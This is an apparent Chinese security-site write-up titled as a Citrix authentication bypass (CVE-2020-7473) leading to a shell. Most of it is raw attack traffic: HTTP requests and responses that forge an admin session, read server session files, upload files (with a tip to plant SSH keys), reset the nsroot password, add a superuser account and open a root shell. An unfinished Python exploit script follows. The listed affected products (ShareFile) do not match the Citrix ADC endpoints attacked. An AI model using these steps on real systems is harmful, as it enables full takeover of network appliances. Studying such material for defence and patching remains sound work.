<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>（CVE-2020-7473）Citrix 认证绕过getshell</h1><h2>一、漏洞简介</h2><h2>二、漏洞影响</h2><p>ShareFile storage zones Controller 5.9.0</p><p>ShareFile storage zones Controller 5.8.0</p><p>ShareFile storage zones Controller 5.7.0</p><p>ShareFile StorageZones Controller 5.6.0</p><p>ShareFile StorageZones Controller 5.5.0</p><p>及ShareFile StorageZones Controller更早版本</p><h2>三、复现过程</h2><h3>0x01 CreateSession</h3><p>request</p><p>POST /pcidss/report?type=allprofiles&amp;sid=loginchallengeresponse1requestbody&amp;username=nsroot&amp;set=1 HTTP/1.1<br />Host: www.0-sec.org:9080<br />User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36 C845D9D38B3A68F4F74057DB542AD252 tx/2.0<br />Content-Length: 44<br />Accept-Encoding: gzip, deflate<br />Connection: close<br />Content-Type: application/xml<br />Range: bytes=0-102400<br />X-Nitro-Pass: jr9bt<br />X-Nitro-User: boej3<br /><br />&lt;appfwprofile&gt;&lt;login&gt;&lt;/login&gt;&lt;/appfwprofile&gt;</p><p>response</p><p>HTTP/1.1 406 Not Acceptable<br />Date: Sun, 12 Jul 2020 07:52:00 GMT<br />Server: Apache/2.4.34 (Unix)<br />Set-Cookie: SESSID=eb1780b044676f588dbcc2a6305f6b57; path=/; HttpOnly<br />Expires: Thu, 19 Nov 1981 08:52:00 GMT<br />Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0<br />Pragma: no-cache<br />Content-Length: 4489<br />Connection: close<br />Content-Type: application/xml; charset=utf-8<br /><br />&lt;div style="color: red; margin: 10px" title="More information about this error may be available in the server error log. Please contact the server administrator"&gt;An internal server error was encountered&lt;/div&gt;&lt;div style="color: red; margin: 10px" title="More information about this error may be available in the server error log. Please contact the server administrator"&gt;An internal server error was encountered&lt;/div&gt;&lt;div style="color: red; margin: 10px" title="More information about this error may be available in the server error log. Please contact the server administrator"&gt;An internal server error was encountered&lt;/div&gt;&lt;div style="color: red; margin: 10px" title="More information about this error may be available in the server error log. Please contact the server administrator"&gt;An internal server error was encountered&lt;/div&gt;&lt;div style="color: red; margin: 10px" title="More information about this error may be available in the server error log. Please contact the server administrator"&gt;An internal server error was encountered&lt;/div&gt;&lt;div style="color: red; margin: 10px" title="More information about this error may be available in the server error log. Please contact the server administrator"&gt;An internal server error was encountered&lt;/div&gt;&lt;div style="color: red; margin: 10px" title="More information about this error may be available in the server error log. Please contact the server administrator"&gt;An internal server error was encountered&lt;/div&gt;&lt;div style="color: red; margin: 10px" title="More information about this error may be available in the server error log. Please contact the server administrator"&gt;An internal server error was encountered&lt;/div&gt;&lt;div style="color: red; margin: 10px" title="More information about this error may be available in the server error log. Please contact the server administrator"&gt;An internal server error was encountered&lt;/div&gt;&lt;div style="color: red; margin: 10px" title="More information about this error may be available in the server error log. Please contact the server administrator"&gt;An internal server error was encountered&lt;/div&gt;&lt;?xml version="1.0"?&gt;<br />&lt;nitroResponse&gt;&lt;errorcode&gt;-1&lt;/errorcode&gt;&lt;message&gt;MISMATCH_OBJECTNAME_ERROR&lt;/message&gt;&lt;severity&gt;ERROR&lt;/severity&gt;&lt;/nitroResponse&gt;<br />&lt;div style="color: red; margin: 10px" title="More information about this error may be available in the server error log. Please contact the server administrator"&gt;An internal server error was encountered&lt;/div&gt;&lt;div style="color: red; margin: 10px" title="More information about this error may be available in the server error log. Please contact the server administrator"&gt;An internal server error was encountered&lt;/div&gt;&lt;?xml version="1.0"?&gt;<br />&lt;nitroResponse&gt;&lt;errorcode&gt;-1&lt;/errorcode&gt;&lt;message&gt;MISMATCH_OBJECTNAME_ERROR&lt;/message&gt;&lt;severity&gt;ERROR&lt;/severity&gt;&lt;/nitroResponse&gt;<br />&lt;div style="color: red; margin: 10px" title="More information about this error may be available in the server error log. Please contact the server administrator"&gt;An internal server error was encountered&lt;/div&gt;&lt;div style="color: red; margin: 10px" title="More information about this error may be available in the server error log. Please contact the server administrator"&gt;An internal server error was encountered&lt;/div&gt;&lt;?xml version="1.0"?&gt;<br />&lt;nitroResponse&gt;&lt;errorcode&gt;-1&lt;/errorcode&gt;&lt;message&gt;MISMATCH_OBJECTNAME_ERROR&lt;/message&gt;&lt;severity&gt;ERROR&lt;/severity&gt;&lt;/nitroResponse&gt;<br />&lt;div style="color: red; margin: 10px" title="More information about this error may be available in the server error log. Please contact the server administrator"&gt;An internal server error was encountered&lt;/div&gt;&lt;div style="color: red; margin: 10px" title="More information about this error may be available in the server error log. Please contact the server administrator"&gt;An internal server error was encountered&lt;/div&gt;&lt;?xml version="1.0"?&gt;<br />&lt;nitroResponse&gt;&lt;errorcode&gt;-1&lt;/errorcode&gt;&lt;message&gt;MISMATCH_OBJECTNAME_ERROR&lt;/message&gt;&lt;severity&gt;ERROR&lt;/severity&gt;&lt;/nitroResponse&gt;<br />&lt;div style="color: red; margin: 10px" title="More information about this error may be available in the server error log. Please contact the server administrator"&gt;An internal server error was encountered&lt;/div&gt;&lt;div style="color: red; margin: 10px" title="More information about this error may be available in the server error log. Please contact the server administrator"&gt;An internal server error was encountered&lt;/div&gt;&lt;?xml version="1.0"?&gt;<br />&lt;nitroResponse&gt;&lt;errorcode&gt;-1&lt;/errorcode&gt;&lt;message&gt;MISMATCH_OBJECTNAME_ERROR&lt;/message&gt;&lt;severity&gt;ERROR&lt;/severity&gt;&lt;/nitroResponse&gt;</p><h3>0x02 fix session</h3><p>request</p><p>GET /menu/ss?sid=nsroot&amp;username=nsroot&amp;force_setup=1 HTTP/1.1<br />Host: www.0-sec.org:9080<br />User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36 C845D9D38B3A68F4F74057DB542AD252 tx/2.0<br />Accept-Encoding: gzip, deflate<br />Connection: close<br />Cookie: SESSID=eb1780b044676f588dbcc2a6305f6b57<br />Range: bytes=0-102400</p><p>response</p><p>HTTP/1.1 302 Found<br />Date: Sun, 12 Jul 2020 07:54:31 GMT<br />Server: Apache/2.4.34 (Unix)<br />Expires: Thu, 19 Nov 1981 08:52:00 GMT<br />Cache-Control: no-store, no-cache, must-revalidate<br />Pragma: no-cache<br />Set-Cookie: is_cisco_platform=-1; expires=Wed, 07-Jul-2021 07:54:32 GMT; Max-Age=31104000; path=/; HttpOnly<br />Location: /menu/neo<br />Content-Length: 416<br />Connection: close<br />Content-Type: text/html; charset=UTF-8<br /><br />&lt;div style="color: red; margin: 10px" title="More information about this error may be available in the server error log. Please contact the server administrator"&gt;An internal server error was encountered&lt;/div&gt;&lt;div style="color: red; margin: 10px" title="More information about this error may be available in the server error log. Please contact the server administrator"&gt;An internal server error was encountered&lt;/div&gt;</p><h3>0x03 Get rand_key</h3><p>request</p><p>GET /menu/stc HTTP/1.1<br />Host: www.0-sec.org:9080<br />User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36 C845D9D38B3A68F4F74057DB542AD252 tx/2.0<br />Accept-Encoding: gzip, deflate<br />Connection: close<br />Cookie: SESSID=eb1780b044676f588dbcc2a6305f6b57; is_cisco_platform=-1<br />Range: bytes=0-102400</p><p>response</p><p>HTTP/1.1 206 Partial Content<br />Date: Sun, 12 Jul 2020 07:54:35 GMT<br />Server: Apache/2.4.34 (Unix)<br />Expires: Thu, 19 Nov 1981 08:52:00 GMT<br />Cache-Control: no-store, no-cache, must-revalidate<br />Pragma: no-cache<br />Vary: Accept-Encoding<br />Content-Range: bytes 0-4149/4150<br />Content-Length: 15501<br />Connection: close<br />Content-Type: text/html; charset=UTF-8<br /><br />&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"&gt;<br />&lt;html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en"&gt;<br />&lt;head&gt;<br />&lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt;<br />&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br />&lt;title&gt;Citrix ADC - Statistics&lt;/title&gt;<br />&lt;link href="/admin_ui/common/css/ns/ui.css" rel="stylesheet" type="text/css" /&gt;<br />&lt;script type="text/javascript" src="/admin_ui/common/js/jquery/_jquery.min.js"&gt;&lt;/script&gt;<br />&lt;script type="text/javascript"&gt;<br />//rand is used in utils.js in the URL to logout and in the URL to update NSAPI token<br />//rand_key &amp; rand are used in utils.js to avoid CSRF in all POST requests<br />var rand = "181103693.1594540472072128";<br />var rand_key = "14247218531594540472072170";<br />var NSERR_SESSION_EXPIRED = 444;<br /><br />&lt;/script&gt;<br />...<br />&lt;p align="center" class="ns_alert_text"&gt;&lt;b&gt;Error retrieving data.&lt;br&gt;return code = 354.&lt;br&gt;Error message = Invalid username or password.&lt;br&gt;&lt;/b&gt;&lt;/p&gt;&lt;/div&gt;</p><p>note: var rand = "181103693.1594540472072128";</p><h3>0x04 re-break Session</h3><p>request</p><p>POST /pcidss/report?type=allprofiles&amp;sid=loginchallengeresponse1requestbody&amp;username=nsroot&amp;set=1 HTTP/1.1<br />Host: www.0-sec.org:9080<br />User-Agent: python-requests/2.20.0<br />Content-Length: 44<br />Accept-Encoding: gzip, deflate<br />Connection: close<br />Content-Type: application/xml<br />Cookie: SESSID=eb1780b044676f588dbcc2a6305f6b57; is_cisco_platform=-1<br />Range: bytes=0-102400<br />X-NITRO-USER: mMg96GTR<br />X-NITRO-PASS: QXom91tz<br /><br />&lt;appfwprofile&gt;&lt;login&gt;&lt;/login&gt;&lt;/appfwprofile&gt;</p><p>response</p><p>HTTP/1.1 406 Not Acceptable<br />Date: Sun, 12 Jul 2020 07:54:49 GMT<br />Server: Apache/2.4.34 (Unix)<br />Expires: Thu, 19 Nov 1981 08:52:00 GMT<br />Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0<br />Pragma: no-cache<br />Content-Length: 4489<br />Connection: close<br />Content-Type: application/xml; charset=utf-8<br /><br />&lt;div style="color: red; margin: 10px" title="More information about this error may be available in the server error log. Please contact the server administrator"&gt;An internal server error was encountered&lt;/div&gt;&lt;div style="color: red; margin: 10px" title="More information about this error may be available in the server error log. Please contact the server administrator"&gt;An internal server error was encountered&lt;/div&gt;&lt;div style="color: red; margin: 10px" title="More information about this error may be available in the server error log. Please contact the server administrator"&gt;An internal server error was encountered&lt;/div&gt;&lt;div style="color: red; margin: 10px" title="More information about this error may be available in the server error log. Please contact the server administrator"&gt;An internal server error was encountered&lt;/div&gt;&lt;div style="color: red; margin: 10px" title="More information about this error may be available in the server error log. Please contact the server administrator"&gt;An internal server error was encountered&lt;/div&gt;&lt;div style="color: red; margin: 10px" title="More information about this error may be available in the server error log. Please contact the server administrator"&gt;An internal server error was encountered&lt;/div&gt;&lt;div style="color: red; margin: 10px" title="More information about this error may be available in the server error log. Please contact the server administrator"&gt;An internal server error was encountered&lt;/div&gt;&lt;div style="color: red; margin: 10px" title="More information about this error may be available in the server error log. Please contact the server administrator"&gt;An internal server error was encountered&lt;/div&gt;&lt;div style="color: red; margin: 10px" title="More information about this error may be available in the server error log. Please contact the server administrator"&gt;An internal server error was encountered&lt;/div&gt;&lt;div style="color: red; margin: 10px" title="More information about this error may be available in the server error log. Please contact the server administrator"&gt;An internal server error was encountered&lt;/div&gt;&lt;?xml version="1.0"?&gt;<br />&lt;nitroResponse&gt;&lt;errorcode&gt;-1&lt;/errorcode&gt;&lt;message&gt;MISMATCH_OBJECTNAME_ERROR&lt;/message&gt;&lt;severity&gt;ERROR&lt;/severity&gt;&lt;/nitroResponse&gt;<br />&lt;div style="color: red; margin: 10px" title="More information about this error may be available in the server error log. Please contact the server administrator"&gt;An internal server error was encountered&lt;/div&gt;&lt;div style="color: red; margin: 10px" title="More information about this error may be available in the server error log. Please contact the server administrator"&gt;An internal server error was encountered&lt;/div&gt;&lt;?xml version="1.0"?&gt;<br />&lt;nitroResponse&gt;&lt;errorcode&gt;-1&lt;/errorcode&gt;&lt;message&gt;MISMATCH_OBJECTNAME_ERROR&lt;/message&gt;&lt;severity&gt;ERROR&lt;/severity&gt;&lt;/nitroResponse&gt;<br />&lt;div style="color: red; margin: 10px" title="More information about this error may be available in the server error log. Please contact the server administrator"&gt;An internal server error was encountered&lt;/div&gt;&lt;div style="color: red; margin: 10px" title="More information about this error may be available in the server error log. Please contact the server administrator"&gt;An internal server error was encountered&lt;/div&gt;&lt;?xml version="1.0"?&gt;<br />&lt;nitroResponse&gt;&lt;errorcode&gt;-1&lt;/errorcode&gt;&lt;message&gt;MISMATCH_OBJECTNAME_ERROR&lt;/message&gt;&lt;severity&gt;ERROR&lt;/severity&gt;&lt;/nitroResponse&gt;<br />&lt;div style="color: red; margin: 10px" title="More information about this error may be available in the server error log. Please contact the server administrator"&gt;An internal server error was encountered&lt;/div&gt;&lt;div style="color: red; margin: 10px" title="More information about this error may be available in the server error log. Please contact the server administrator"&gt;An internal server error was encountered&lt;/div&gt;&lt;?xml version="1.0"?&gt;<br />&lt;nitroResponse&gt;&lt;errorcode&gt;-1&lt;/errorcode&gt;&lt;message&gt;MISMATCH_OBJECTNAME_ERROR&lt;/message&gt;&lt;severity&gt;ERROR&lt;/severity&gt;&lt;/nitroResponse&gt;<br />&lt;div style="color: red; margin: 10px" title="More information about this error may be available in the server error log. Please contact the server administrator"&gt;An internal server error was encountered&lt;/div&gt;&lt;div style="color: red; margin: 10px" title="More information about this error may be available in the server error log. Please contact the server administrator"&gt;An internal server error was encountered&lt;/div&gt;&lt;?xml version="1.0"?&gt;<br />&lt;nitroResponse&gt;&lt;errorcode&gt;-1&lt;/errorcode&gt;&lt;message&gt;MISMATCH_OBJECTNAME_ERROR&lt;/message&gt;&lt;severity&gt;ERROR&lt;/severity&gt;&lt;/nitroResponse&gt;</p><h3>0x05 Read Dir</h3><p>request</p><p>POST /rapi/filedownload?filter=path:%2Fvar%2Fnstmp HTTP/1.1<br />Host: www.0-sec.org:9080<br />User-Agent: python-requests/2.20.0<br />Accept-Encoding: gzip, deflate<br />Accept: */*<br />Connection: close<br />Content-Type: application/xml<br />X-NITRO-USER: N6RRf049<br />X-NITRO-PASS: FcdXbqXr<br />rand_key: 32946879.1594556816473396<br />Cookie: SESSID=eb1780b044676f588dbcc2a6305f6b57; is_cisco_platform=0; startupapp=neo<br />Content-Length: 31<br /><br />&lt;clipermission&gt;&lt;/clipermission&gt;</p><p>response</p><p>HTTP/1.1 406 Not Acceptable<br />Date: Sun, 12 Jul 2020 12:27:04 GMT<br />Server: Apache<br />X-Frame-Options: SAMEORIGIN<br />Expires: -1<br />Cache-Control: private, must-revalidate, post-check=0, pre-check=0<br />Pragma: private<br />Content-Disposition: attachment;filename="nstmp"<br />Accept-Ranges: bytes<br />Content-Length: 512<br />X-XSS-Protection: 1; mode=block<br />Keep-Alive: timeout=15, max=98<br />Connection: Keep-Alive<br />Content-Type: application/octet-stream<br /><br />...<br />sess_6680400dad3be5585d4ac9880d5f634f...<br />sess_774dd8a02a254bd09c480cd0ba244598...<br />sess_6c5c31300c22b200f0273e7a13be47cb....</p><h3>0x06 Read Session</h3><p>resquest</p><p>POST /rapi/filedownload?filter=path:%2Fvar%2Fnstmp%2Fsess_6c5c31300c22b200f0273e7a13be47cb HTTP/1.1<br />Host: www.0-sec.org:9080<br />User-Agent: python-requests/2.20.0<br />Accept-Encoding: gzip, deflate<br />Accept: */*<br />Connection: close<br />Content-Type: application/xml<br />X-NITRO-USER: N6RRf049<br />X-NITRO-PASS: FcdXbqXr<br />rand_key: 32946879.1594556816473396<br />Cookie: SESSID=eb1780b044676f588dbcc2a6305f6b57; is_cisco_platform=0; startupapp=neo<br />Content-Length: 31<br /><br />&lt;clipermission&gt;&lt;/clipermission&gt;</p><p>response</p><p>HTTP/1.1 406 Not Acceptable<br />Date: Sun, 12 Jul 2020 12:30:33 GMT<br />Server: Apache<br />X-Frame-Options: SAMEORIGIN<br />Expires: -1<br />Cache-Control: private, must-revalidate, post-check=0, pre-check=0<br />Pragma: private<br />Content-Disposition: attachment;filename="sess_6c5c31300c22b200f0273e7a13be47cb"<br />Accept-Ranges: bytes<br />Content-Length: 2162<br />X-XSS-Protection: 1; mode=block<br />Keep-Alive: timeout=15, max=100<br />Connection: Keep-Alive<br />Content-Type: application/octet-stream<br /><br />NSAPI|s:254:"##703FFFA9A2E71F7435B67182A95E196770FF69246DB68B6BE92E825B8A520D00F1FCF6E23F897090DBDEDBE817FFE81D1501200A8BB36C9FFA176EDA41E473DC240A804B90B8BFE1EC30DA87C6FAD3261A8B3C09C7BB82F97DDB3DB41A69CA0B849AFD6B17827463358B700D5847F91F78619B8FA1A98ED4DED3509AB11C";NSAPI_DOMAIN|s:0:"";NSAPI_PATH|s:1:"/";login_warning|s:0:"";sysid|s:6:"450070";oemid|s:1:"0";superuser|s:4:"true";nsbw|i:0;ns_is_sgw|s:5:"false";nsbrandDesc|s:7:"ADC VPX";username|s:6:"nsroot";timezone_offset|i:28800;nsversion|s:63:" NS12.1: Build 55.13.nc, Date: Nov  4 2019, 22:20:18   (64-bit)";nsversion_error|b:0;ns_mode|i:2;nshostDesc|s:22:"49.234.251.224 (ADC01)";nsbrand|s:2:"NS";nsvpx|s:3:"VPX";ns_model|s:4:"1000";ns_aws_pin|s:0:"";ns_is_aws|s:5:"false";ns_is_azure|s:5:"false";ns_is_gcp|s:5:"false";rand|s:26:"845810655.1594556994263502";rand_key|s:26:"13590513441594556994263577";licenseMap|a:62:{s:2:"wl";b:1;s:2:"sp";b:1;s:2:"lb";b:1;s:2:"cs";b:1;s:2:"cr";b:1;s:2:"sc";b:1;s:3:"cmp";b:1;s:5:"delta";b:0;s:2:"pq";b:1;s:3:"ssl";b:1;s:4:"gslb";b:1;s:5:"gslbp";b:1;s:5:"hdosp";b:1;s:7:"routing";b:1;s:2:"cf";b:1;s:18:"contentaccelerator";b:0;s:2:"ic";b:0;s:6:"sslvpn";b:1;s:14:"f_sslvpn_users";s:4:"1000";s:11:"f_ica_users";s:1:"0";s:3:"aaa";b:1;s:4:"ospf";b:1;s:3:"rip";b:1;s:3:"bgp";b:1;s:7:"rewrite";b:1;s:6:"ipv6pt";b:1;s:5:"appfw";b:0;s:9:"responder";b:1;s:4:"agee";b:0;s:4:"nsxn";b:1;s:13:"htmlinjection";b:1;s:7:"modelid";s:4:"1000";s:4:"push";b:1;s:6:"wionns";b:1;s:7:"appflow";b:1;s:11:"cloudbridge";b:0;s:20:"cloudbridgeappliance";b:0;s:22:"cloudextenderappliance";b:0;s:4:"isis";b:1;s:7:"cluster";b:1;s:2:"ch";b:1;s:6:"appqoe";b:1;s:10:"appflowica";b:1;s:13:"isstandardlic";b:0;s:15:"isenterpriselic";b:1;s:13:"isplatinumlic";b:0;s:9:"issgwylic";b:0;s:8:"isswglic";b:0;s:4:"rise";b:1;s:3:"feo";b:1;s:3:"lsn";b:1;s:13:"licensingmode";s:5:"Local";s:16:"daystoexpiration";s:2:"50";s:8:"rdpproxy";b:1;s:3:"rep";b:0;s:12:"urlfiltering";b:0;s:17:"videooptimization";b:0;s:12:"forwardproxy";b:0;s:15:"sslinterception";b:0;s:23:"remotecontentinspection";b:1;s:11:"adaptivetcp";b:0;s:3:"cqa";b:0;}grouping_separator|s:1:",";decimal_separator|s:1:".";defaultpartition|s:7:"default";</p><h3>0x07 UploadFile Getshell</h3><p>You Can Upload to /root/.ssh/authorized_key Note: Get rand_key &amp; SESSID from file:sess_[32charactor]</p><p>request</p><p>POST /rapi/uploadtext HTTP/1.1<br />Host: www.0-sec.org:9080<br />User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0<br />Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br />Accept-Language: en-US,en;q=0.5<br />Accept-Encoding: gzip, deflate<br />Referer: https://citrix.local/menu/neo<br />DNT: 1<br />rand_key: 845810655.1594556994263502<br />Cookie: SESSID=6c5c31300c22b200f0273e7a13be47cb; startupapp=neo; is_cisco_platform=0; st_splitter=350px; rdx_pagination_size=25%20Per%20Page<br />Upgrade-Insecure-Requests: 1<br />Content-Type: application/x-www-form-urlencoded<br />Content-Length: 92<br /><br />object={"uploadtext":{"filedir":"/tmp/","filedata":"123456","filename":"test123456789.txt"}}</p><p>response</p><p>HTTP/1.1 200 OK<br />Date: Sun, 12 Jul 2020 06:15:05 GMT<br />Server: Apache<br />X-Frame-Options: SAMEORIGIN<br />Expires: Thu, 19 Nov 1981 08:52:00 GMT<br />Cache-Control: no-store, no-cache, must-revalidate<br />Pragma: no-cache<br />X-XSS-Protection: 1; mode=block<br />Content-Length: 34<br />Content-Type: application/json; charset=utf-8<br /><br />{"errorcode":"0","message":"Done"}</p><h3>0x08 ChangePassword &amp;&amp; SSH</h3><p>request</p><p>PUT /nitro/v1/config/systemuser HTTP/1.1<br />Host: www.0-sec.org:9080<br />Content-Length: 83<br />Cache-Control: max-age=0<br />Accept: application/json<br />rand_key: 845810655.1594556994263502<br />NITRO_WEB_APPLICATION: true<br />If-Modified-Since: Thu, 01 Jan 1970 05:30:00 GMT<br />User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36<br />DNT: 1<br />Content-Type: application/json<br />Accept-Encoding: gzip, deflate<br />Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7<br />Cookie: is_cisco_platform=-1; rdx_pagination_size=25%20Per%20Page; SESSID=6c5c31300c22b200f0273e7a13be47cb; startupapp=neo<br />Connection: close<br /><br />{"params":{"warning":"YES"},"systemuser":{"username":"nsroot","password":"boiboi"}}</p><p>response</p><p>HTTP/1.1 200 OK<br />Date: Sun, 12 Jul 2020 12:37:56 GMT<br />Server: Apache/2.4.34 (Unix)<br />Expires: Thu, 19 Nov 1981 08:52:00 GMT<br />Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0<br />Pragma: no-cache<br />Content-Length: 57<br />Connection: close<br />Content-Type: application/json; charset=utf-8<br /><br />{ "errorcode": 0, "message": "Done", "severity": "NONE" }<br />SSH<br />ssh nsroot@www.0-sec.org<br />###############################################################################<br />#                                                                             #<br />#        WARNING: Access to this system is for authorized users only          #<br />#         Disconnect IMMEDIATELY if you are not an authorized user!           #<br />#                                                                             #<br />###############################################################################<br /><br />Password:<br />Last login: Sun Jul 12 14:12:44 2020 from 192.168.3.1<br /> Done<br /> &gt; shell<br />Copyright (c) 1992-2013 The FreeBSD Project.<br />Copyright (c) 1979, 1980, 1983, 1986, 1988, 1989, 1991, 1992, 1993, 1994<br />    The Regents of the University of California. All rights reserved.<br /><br />root@localhost</p><h3>0x09 CreateUser &amp;&amp; SSH</h3><p>request:CreateUser</p><p>POST /nitro/v1/config/systemuser HTTP/1.1<br />Host: www.0-sec.org:9080<br />Content-Length: 83<br />Cache-Control: max-age=0<br />Accept: application/json<br />rand_key: 845810655.1594556994263502<br />NITRO_WEB_APPLICATION: true<br />If-Modified-Since: Thu, 01 Jan 1970 05:30:00 GMT<br />User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36<br />DNT: 1<br />Content-Type: application/json<br />Accept-Encoding: gzip, deflate<br />Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7<br />Cookie: is_cisco_platform=-1; rdx_pagination_size=25%20Per%20Page; SESSID=6c5c31300c22b200f0273e7a13be47cb; startupapp=neo<br />Connection: close<br /><br />object={"params":{"warning":"YES"},"systemuser":{"username":"nsroot1","password":"nsroot1","timeout":"900","maxsession":"20","logging":"ENABLED","externalauth":"ENABLED"}}</p><p>response:CreateUser</p><p>HTTP/1.1 201 Created<br />Date: Sun, 12 Jul 2020 12:46:55 GMT<br />Server: Apache<br />X-Frame-Options: SAMEORIGIN<br />Expires: Thu, 19 Nov 1981 08:52:00 GMT<br />Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0<br />Pragma: no-cache<br />Access-Control-Allow-Origin: *<br />Access-Control-Allow-Credentials: false<br />X-XSS-Protection: 1; mode=block<br />Content-Length: 57<br />Keep-Alive: timeout=15, max=100<br />Connection: Keep-Alive<br />Content-Type: application/json; charset=utf-8<br /><br />{ "errorcode": 0, "message": "Done", "severity": "NONE" }<br />request:binding superadmin policy<br />POST /nitro/v1/config/systemuser_systemcmdpolicy_binding HTTP/1.1<br />Host: www.0-sec.org:9080<br />Content-Length: 83<br />Cache-Control: max-age=0<br />Accept: application/json<br />rand_key: 845810655.1594556994263502<br />NITRO_WEB_APPLICATION: true<br />If-Modified-Since: Thu, 01 Jan 1970 05:30:00 GMT<br />User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36<br />DNT: 1<br />Content-Type: application/json<br />Accept-Encoding: gzip, deflate<br />Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7<br />Cookie: is_cisco_platform=-1; rdx_pagination_size=25%20Per%20Page; SESSID=6c5c31300c22b200f0273e7a13be47cb; startupapp=neo<br />Connection: close<br /><br />object={"params":{"warning":"YES"},"systemuser_systemcmdpolicy_binding":{"policyname":"superuser","priority":"0","username":"nsroot1"}}<br />response:binding superadmin policy<br />HTTP/1.1 201 Created<br />Date: Sun, 12 Jul 2020 12:55:27 GMT<br />Server: Apache<br />X-Frame-Options: SAMEORIGIN<br />Expires: Thu, 19 Nov 1981 08:52:00 GMT<br />Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0<br />Pragma: no-cache<br />Access-Control-Allow-Origin: *<br />Access-Control-Allow-Credentials: false<br />X-XSS-Protection: 1; mode=block<br />Content-Length: 57<br />Keep-Alive: timeout=15, max=100<br />Connection: Keep-Alive<br />Content-Type: application/json; charset=utf-8<br /><br />{ "errorcode": 0, "message": "Done", "severity": "NONE" }<br />SSH<br />ssh nsroot1@www.0-sec.org<br />###############################################################################<br />#                                                                             #<br />#        WARNING: Access to this system is for authorized users only          #<br />#         Disconnect IMMEDIATELY if you are not an authorized user!           #<br />#                                                                             #<br />###############################################################################<br /><br />Password:<br />Last login: Sun Jul 12 20:52:27 2020 from 47.75.37.35<br /> Done<br />&gt; shell<br />Copyright (c) 1992-2013 The FreeBSD Project.<br />Copyright (c) 1979, 1980, 1983, 1986, 1988, 1989, 1991, 1992, 1993, 1994<br />    The Regents of the University of California. All rights reserved.<br /><br />root@localhost#</p><h3>poc</h3><p>3.png</p><p>#!/usr/bin/env python<br /><br />import requests<br />import sys<br />import string<br />import random<br />import json<br />from urllib.parse import quote<br /><br /><br /><br />requests.packages.urllib3.disable_warnings()<br /><br />def random_string(length=8):<br />    chars = string.ascii_letters + string.digits<br />    random_string = ''.join(random.choice(chars) for x in range(length))<br />    return random_string<br /><br />def create_session(base_url, session):<br />    url = '{0}/pcidss/report'.format(base_url)<br /><br />    params = {<br />        'type':'allprofiles',<br />        'sid':'loginchallengeresponse1requestbody',<br />        'username':'nsroot',<br />        'set':'1'<br />    }<br /><br />    headers = {<br />        'Content-Type':'application/xml',<br />        'X-NITRO-USER':random_string(),<br />        'X-NITRO-PASS':random_string(),<br />    }<br /><br />    data = '&lt;appfwprofile&gt;&lt;login&gt;&lt;/login&gt;&lt;/appfwprofile&gt;'<br />    proxies = {"http":"http://127.0.0.1:8080/"}<br />    session.post(url=url, params=params, headers=headers, data=data, verify=False,proxies=proxies)<br />    return session<br /><br />def fix_session(base_url, session):<br />    url = '{0}/menu/ss'.format(base_url)<br /><br />    params = {<br />        'sid':'nsroot',<br />        'username':'nsroot',<br />        'force_setup':'1'<br />    }<br />    proxies = {"http":"http://127.0.0.1:8080/"}<br />    session.get(url=url, params=params, verify=False,proxies=proxies)<br /><br />def get_rand(base_url, session):<br />    url = '{0}/menu/stc'.format(base_url)<br />    proxies = {"http":"http://127.0.0.1:8080/"}<br />    r = session.get(url=url, verify=False,proxies=proxies)<br /><br />    for line in r.text.split('\n'):<br />        if 'var rand =' in line:<br />            rand = line.split('&quot;')[1]<br />            return rand<br /><br />def do_lfi(base_url, session, rand):<br />    url = 